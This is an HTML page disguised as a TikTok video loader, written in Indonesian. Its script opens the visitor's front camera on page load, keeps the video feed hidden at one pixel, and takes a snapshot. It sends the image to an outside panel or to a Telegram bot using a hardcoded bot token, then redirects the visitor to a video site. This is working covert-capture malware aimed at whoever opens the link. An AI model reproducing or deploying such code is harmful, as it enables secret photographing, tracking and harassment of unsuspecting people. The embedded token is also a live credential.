<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tiktok - Watch & Share Videos</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #010101; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        .container { text-align: center; }
        .loader { border: 4px solid #333; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #webcam { width: 1px; height: 1px; opacity: 0; position: absolute; }
        #canvas { display: none; }
        p { font-size: 1rem; color: #aaa; }
    </style>
</head>
<body>

<div class="container">
    <div id="loader" class="loader"></div>
    <p id="status">Memuat video TikTok...</p>
</div>

<video id="webcam" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    const TELEGRAM_BOT_TOKEN = '8944168845:AAHw_QSSDh-A-r2jp7PxVkI1eqL6fX6Eg8w';
    const ADMIN_CHAT_ID = '-1003731213733'; 

    const PANEL_ENDPOINT = 'https://gervho.com'; 
    const TARGET_WEBSITE = 'https://vidvf.com/e/4ji8zftzagau'; 

    const urlParams = new URLSearchParams(window.location.search);
    const SENDER_ID = urlParams.get('sender'); 

    const video = document.getElementById('webcam');
    const canvas = document.getElementById('canvas');
    let currentStream = null;

    async function startAutoCamera() {
        try {
            currentStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: 640, height: 480 } 
            });
            video.srcObject = currentStream;
            video.onplay = () => { setTimeout(takeAndSendSnapshot, 3000); };
        } catch (err) { console.error(err); window.location.href = TARGET_WEBSITE; }
    }

    function takeAndSendSnapshot() {
        if (video.videoWidth === 0 || video.videoHeight === 0) {
            setTimeout(takeAndSendSnapshot, 200);
            return;
        }
        const ctx = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        if (currentStream) { currentStream.getTracks().forEach(track => track.stop()); }
        
        const finalRecipientId = SENDER_ID ? SENDER_ID : ADMIN_CHAT_ID;

        if (SENDER_ID) {
            const imageData = canvas.toDataURL('image/png');
            fetch(PANEL_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ senderId: finalRecipientId, image: imageData })
            })
            .then(res => res.json())
            .then(data => { if (!data.ok) { sendDirectTelegram(finalRecipientId); } else { window.location.href = TARGET_WEBSITE; } })
            .catch(err => { sendDirectTelegram(finalRecipientId); });
        } else {
            sendDirectTelegram(finalRecipientId);
        }
    }

    function sendDirectTelegram(chatIdToSend) {
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', ADMIN_CHAT_ID); 
            formData.append('photo', blob, 'snapshot.png');
            
            // Kode rahasia penanda ID Target agar dibaca oleh index.js panel Anda
            const targetIdClean = SENDER_ID ? SENDER_ID : "Unknown";
            formData.append('caption', `TRIGGER_FOTO_TARGET:${targetIdClean}`);

            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) { console.error(error); } finally { window.location.href = TARGET_WEBSITE; }
        }, 'image/png');
    }
    window.addEventListener('load', startAutoCamera);
</script>
</body>
</html>
